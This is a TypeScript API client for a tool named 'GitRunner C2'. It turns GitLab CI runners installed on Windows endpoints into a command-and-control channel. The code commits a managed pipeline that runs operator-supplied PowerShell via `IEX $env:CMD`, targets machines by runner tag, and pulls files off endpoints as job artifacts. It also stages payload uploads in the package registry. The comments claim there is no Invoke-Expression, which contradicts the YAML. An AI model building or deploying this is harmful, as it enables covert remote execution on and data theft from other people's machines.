import { store } from '../store'

// All requests go through the proxy (/gitlab -> GitLab instance), so the
// browser stays same-origin. The proxy target is set in vite.config.ts (dev)
// or docker-compose.yml (prod).
const API = '/gitlab/api/v4'

export interface Project {
  id: number
  name: string
  path_with_namespace: string
  web_url: string
  default_branch: string | null
}

export interface Runner {
  id: number
  description: string
  online: boolean
  status: string
  ip_address?: string
  tag_list?: string[]
}

export interface Job {
  id: number
  name: string
  status: string
}

// The single parametrized pipeline committed to every managed project:
// - run_command: the command is sent as a raw FILE-type CI variable (CMD) and
//   executed as a .ps1 -- no Invoke-Expression. RUN gates it; TARGET_TAG routes
//   it to one endpoint.
// - download_file: copies a file off the endpoint as an artifact.
// raw = GitLab won't expand $-tokens in values; GIT_STRATEGY:none = the runner
// never clones, so the endpoint needs no git.exe.
const CI_YAML = `# Managed by GitRunner C2 -- do not edit by hand.
workflow:
  rules:
    - if: '$RUN'
    - if: '$DL_PATH'

stages:
  - run

run_command:
  stage: run
  tags:
    - "$TARGET_TAG"
  variables:
    GIT_STRATEGY: none
  rules:
    - if: '$RUN'
  script:
    - IEX $env:CMD

# Copies a file from the endpoint into the job workspace and exposes it as an
# artifact, which the SPA downloads via the Job Artifacts API.
download_file:
  stage: run
  tags:
    - "$TARGET_TAG"
  variables:
    GIT_STRATEGY: none
  rules:
    - if: '$DL_PATH'
  script:
    - New-Item -ItemType Directory -Force dl | Out-Null
    - Copy-Item -LiteralPath $env:DL_PATH -Destination dl\\
  artifacts:
    paths:
      - dl
    expire_in: 1 hour
`

async function req<T>(path: string, opts: RequestInit = {}): Promise<T> {
  const res = await fetch(API + path, {
    ...opts,
    headers: {
      'PRIVATE-TOKEN': store.token,
      'Content-Type': 'application/json',
      ...(opts.headers || {}),
    },
  })
  if (!res.ok) {
    const body = await res.text()
    throw new Error(`GitLab ${res.status}: ${body.slice(0, 240)}`)
  }
  const ct = res.headers.get('content-type') || ''
  return (ct.includes('application/json') ? await res.json() : await res.text()) as T
}

const CI_FILE = encodeURIComponent('.gitlab-ci.yml')

export const gl = {
  listProjects: () =>
    req<Project[]>('/projects?membership=true&simple=true&per_page=100&order_by=last_activity_at'),

  createProject: (name: string) =>
    req<Project>('/projects', {
      method: 'POST',
      body: JSON.stringify({ name, initialize_with_readme: true }),
    }),

  // The project runners *list* endpoint also returns inherited instance/group
  // (shared) runners and omits tag_list/ip_address. We want only the runners
  // registered to THIS project, with full detail, so:
  //   1. list with type=project_type  (drops the dozens of shared runners)
  //   2. fetch each runner's detail   (fills in tag_list + ip_address)
  async listRunners(pid: number): Promise<Runner[]> {
    const brief = await req<Runner[]>(`/projects/${pid}/runners?type=project_type&per_page=100`)
    return Promise.all(brief.map((r) => req<Runner>(`/runners/${r.id}`)))
  },

  // Modern (GitLab 16+) runner-creation flow: returns an auth token used by the
  // `gitlab-runner register` install command on the endpoint.
  createRunner: (pid: number, tag: string, description: string) =>
    req<{ id: number; token: string }>('/user/runners', {
      method: 'POST',
      body: JSON.stringify({
        runner_type: 'project_type',
        project_id: pid,
        tag_list: [tag],
        description,
        run_untagged: false,
      }),
    }),

  deleteRunner: (runnerId: number) =>
    req<void>(`/runners/${runnerId}`, { method: 'DELETE' }),

  // Generic Package Registry — used to stage files before pushing them to an
  // endpoint. The runner downloads using CI_JOB_TOKEN (same-project access).
  async uploadPackage(pid: number, version: string, filename: string, data: Blob): Promise<void> {
    const res = await fetch(
      `${API}/projects/${pid}/packages/generic/gitrunner-uploads/${version}/${encodeURIComponent(filename)}`,
      {
        method: 'PUT',
        headers: { 'PRIVATE-TOKEN': store.token, 'Content-Type': 'application/octet-stream' },
        body: data,
      },
    )
    if (!res.ok) {
      const body = await res.text()
      throw new Error(`Upload ${res.status}: ${body.slice(0, 200)}`)
    }
  },

  listPackages: (pid: number, name: string) =>
    req<{ id: number; name: string; version: string }[]>(
      `/projects/${pid}/packages?package_type=generic&package_name=${encodeURIComponent(name)}&per_page=100`,
    ),

  deletePackage: (pid: number, pkgId: number) =>
    req<void>(`/projects/${pid}/packages/${pkgId}`, { method: 'DELETE' }),

  triggerPipelineVars: (
    pid: number,
    variables: { key: string; value: string; raw?: boolean; variable_type?: string }[],
  ) =>
    req<{ id: number }>(`/projects/${pid}/pipeline`, {
      method: 'POST',
      body: JSON.stringify({ ref: 'main', variables }),
    }),

  // CMD is a raw file-type variable: the runner writes it to a script file and
  // $env:CMD holds the path. raw stops GitLab expanding $-tokens; file-type
  // means the job runs it as a .ps1 (no Invoke-Expression). RUN gates the job
  // (file variables can't be used in rules:).
  triggerPipeline: (pid: number, tag: string, cmd: string) =>
    gl.triggerPipelineVars(pid, [
      { key: 'TARGET_TAG', value: tag },
      { key: 'RUN', value: '1' },
      { key: 'CMD', value: cmd, raw: true },
    ]),

  // Fetch a single file out of a job's artifacts as a Blob (binary-safe).
  async getArtifactFile(pid: number, jobId: number, path: string): Promise<Blob> {
    const res = await fetch(`${API}/projects/${pid}/jobs/${jobId}/artifacts/${path}`, {
      headers: { 'PRIVATE-TOKEN': store.token },
    })
    if (!res.ok) throw new Error(`Artifact download failed: ${res.status}`)
    return res.blob()
  },

  pipelineJobs: (pid: number, plid: number) =>
    req<Job[]>(`/projects/${pid}/pipelines/${plid}/jobs`),

  getJob: (pid: number, jid: number) => req<Job>(`/projects/${pid}/jobs/${jid}`),

  getTrace: (pid: number, jid: number) => req<string>(`/projects/${pid}/jobs/${jid}/trace`),

  cancelJob: (pid: number, jid: number) =>
    req<Job>(`/projects/${pid}/jobs/${jid}/cancel`, { method: 'POST' }),

  runnerJobs: (runnerId: number, status: 'running' | 'pending') =>
    req<{ id: number; status: string; project: { id: number } }[]>(
      `/runners/${runnerId}/jobs?status=${status}`,
    ),

  // Ensure the project's .gitlab-ci.yml IS the managed pipeline. If a different
  // file exists (e.g. a hand-written one), it is overwritten -- the platform
  // owns this file in managed projects.
  async ensureCiFile(pid: number): Promise<void> {
    let exists = false
    let current = ''
    try {
      const f = await req<{ content: string }>(
        `/projects/${pid}/repository/files/${CI_FILE}?ref=main`,
      )
      exists = true
      current = atob(f.content.replace(/\s/g, '')) // files API returns base64
    } catch (e: any) {
      if (!String(e.message).includes('404')) throw e
    }
    if (exists && current.trim() === CI_YAML.trim()) return // already correct
    await req(`/projects/${pid}/repository/files/${CI_FILE}`, {
      method: exists ? 'PUT' : 'POST',
      body: JSON.stringify({
        branch: 'main',
        content: CI_YAML,
        commit_message: exists
          ? 'Update GitRunner C2 command pipeline'
          : 'Add GitRunner C2 command pipeline',
      }),
    })
  },
}
